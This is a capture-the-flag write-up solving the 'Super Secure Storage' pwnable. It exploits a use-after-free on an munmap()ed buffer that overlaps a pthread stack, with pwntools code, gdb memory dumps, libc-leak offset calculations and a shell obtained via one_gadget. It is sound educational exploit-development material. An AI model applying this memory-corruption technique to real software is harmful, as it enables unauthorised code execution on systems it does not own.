# Super Secure Storage

The first step of solving pwnables is usually running them,
so let's see what we got.

```
$ gdb ./service
$ checksec
CANARY    : ENABLED
FORTIFY   : ENABLED
NX        : ENABLED
PIE       : ENABLED
RELRO     : FULL
```

Damn, that's a lot of protection!


A good start is to run the binary and see what functionality it has before
trying to reverse it.

This is the menu we're greeted with when running it:
```
Welcome to TG File Uploader v1.42
1. Register
2. Upload data
3. Show data
4. Update data
5. Store data securely
6. Delete data
7. Log out
8. Exit
```

Let's try to understand what the different menu options are doing.

### Register
Doesn't really let us do anything, but it initializes an important data
structure.

It does the following:
1. Reads 8 bytes from `/dev/urandom` to initialize an XOR key
2. Initializes a pthread mutex
3. Initializes a pthread conditional variable

### Upload
Enables us to upload data.
We have to specify a size, and then the program proceeds to read that many
bytes. However, the size is rounded up to the nearest `PAGE_SIZE` (4096). The
data is allocated using `mmap()`, which will be important later!

### Show
If we upload some data, we can view it using this menu option. Either as text,
or an array of integers. There's no checking to see if we entered more than 4
characters, but this doesn't seem exploitable in any way.

### Update
Update the data we stored earlier. Nothing special here, the size is still the
same as before.

### Store
This is a really weird function. It will start a new pthread if one doesn't
already exist. The pthread runs a function that waits for a conditional
variable, and XOR's the data specified when signalled.
 
### Delete
Unmaps the memory allocated by `upload()`. This function does not set the
pointer to `NULL`, which means we have a nice UAF bug!

### Log out
Signals the pthread to exit, and then asks if we really want to quit. If we
answer `y`, the global user structure will be zeroed.

Finding a way to exploit the `mmap` UAF bug is the first step. Thankfully, the
program uses phtreads. It's possible to have an `mmap()`ed region overlap with
the stack of a pthread if the sizes match! The stack size of a pthread on
Ubuntu is 8 MB, so we can assume that the target system also has this value.

1. Register a user
2. upload 8 MB (stack size) of data
3. delete the data (we now have a pointer to an munmap()ed region
4. store the data, leading to the creation of a pthread
5. show the data as an array, thus leaking the return address used by the
pthread
6. update the data, overwriting the pthread stack with data controlled by us

There are a few things we have to figure out before we can pwn the binary.
* What's the offset from the start of our mmap()ed region to the return address
on the stack?
* What's the offset from the leaked memory address to the libc base?
* What address should we return to?

To find the required offsets, we attach to the running process with gdb after
triggering the bug. First of all, following is the code to perform all the
required actions so far:

```python
from pwn import *

r = process("./service")
context(terminal = ["tmux", "splitw"])
gdb.attach(r, """
	c
	""")

def register():
    r.sendline("1")
    r.recvuntil(">")

def upload(data):
    r.sendline("2")
    r.recvuntil("Size: ")
    r.sendline(str(len(data)))
    r.recvuntil("Data: ")
    r.send(data)
    r.recvuntil(">")

def update(data):
    r.sendline("4")
    r.recvuntil("Data: ")
    r.send(data)
    r.recvuntil(">")

def delete():
    r.sendline("6")
    r.recvuntil(">")

def store():
    r.sendline("5")
    r.recvuntil(") ")
    r.sendline("24")
    r.recvuntil(">")

def show(start, stop=0):
    ret = []
    r.sendline("3")
    r.recvuntil(">")
    r.sendline("2")
    r.recvuntil("start:")
    r.sendline(str(start))
    r.recvuntil("stop:")
    if stop == 0:
        stop = start + 1
    r.sendline(str(stop))

    for i in range(start, stop):
        r.recvuntil(": ")
        addr = r.recvline()
        ret.append(int(addr, 10))

    r.recvuntil(">")
    return ret

size = (1024 * 1024 * 8)
data = "A"* size

register()
upload(data)
delete()
store()

r.close()
```

The code will split a tmux pane in half and automatically attach gdb.
You can also attach using the PID of the service process.

```
(gdb) thread
[Current thread is 1 (Thread 0x7f169be12700 (LWP 2799))]
(gdb) thread apply 2 bt

Thread 2 (Thread 0x7f169b60f700 (LWP 2811)):
#0  pthread_cond_wait@@GLIBC_2.3.2 ()
    at ../sysdeps/unix/sysv/linux/x86_64/pthread_cond_wait.S:185
#1  0x0000564572e560b3 in ?? ()
#2  0x00007f169b60f700 in ?? ()
#3  0x00007f169b9e16ba in start_thread (arg=0x7f169b60f700)
    at pthread_create.c:333
#4  0x00007f169b71741d in clone ()
    at ../sysdeps/unix/sysv/linux/x86_64/clone.S:109
(gdb) thread apply 2 i r rsp

Thread 2 (Thread 0x7f169b60f700 (LWP 2811)):
rsp            0x7f169b60ef20   0x7f169b60ef20
(gdb) x/10a 0x7f169b60ef20
0x7f169b60ef20: 0x0     0x5645730580b0
0x7f169b60ef30: 0x564573058088  0x0
0x7f169b60ef40: 0x7f169b60f700  0x564572e560b3
0x7f169b60ef50: 0x7f169b60f700  0x7f169b9e16ba <start_thread+202>
0x7f169b60ef60: 0x0     0x7f169b60f700
```

We can see that the address at 0x7f169b60ef48 matches the return address in the
backtrace of thread 2 (0x564572e560b3). We can overwrite this value to hijack
the control flow of the program. By looking at `/proc/<pid>/maps`, or running
`vmmap` in `gdb-peda`, we find that the stack of thread 2 starts at address
0x7f169ae10000 and ends at 0x7f169b610000.

To find a valid target to return to, we need to defeat ASLR first. If we
continue looking for interesting values to leak, we stumble upon a memory
address that is located inside libc. At address 0x7f169b60eff8 gdb tells us that
we have `clone+109` (0x7f169b71741d). This is the address of the `clone`
function inside libc, plus 109.

To calculate the offsets we do:
```
(gdb) p 0x7f169b60ef48 - 0x7f169ae10000
$1 = 8384328
(gdb) p 0x7f169b60eff8 - 0x7f169ae10000
$2 = 8384504
```

In pseudo-code:
```C
ret_offset = pthread_ret_addr - mmap_base;
libc_leak = phtread_clone_addr - mmap_base;
```

With these two offsets we can continue on with our exploit.

To figure out what we should return to, we can use the fantastic tool
[one_gadget](https://github.com/david942j/one_gadget). If we are lazy, we can
just test all the different gadgets instead of checking the constraints in gdb.

If we put it all together, we end up with a nice exploit. You can see it
[here](src/upload.py).

```
$ python2 upload.py
Opening connection to storage.tghack.no on port 1337: Done
[*] leak: 0x7fa8418ab41d
[*] libc base: 0x7fa8417a4000
[+] getting shell
[*] Switching to interactive mode
$ id
uid=1000(pewz) gid=1000(pewz) groups=1000(pewz),27(sudo),110(lxd),999(docker)
$ cat flag.txt
TG18{h3lp_s0me0ne_st0l3_my_st4ck!}
```
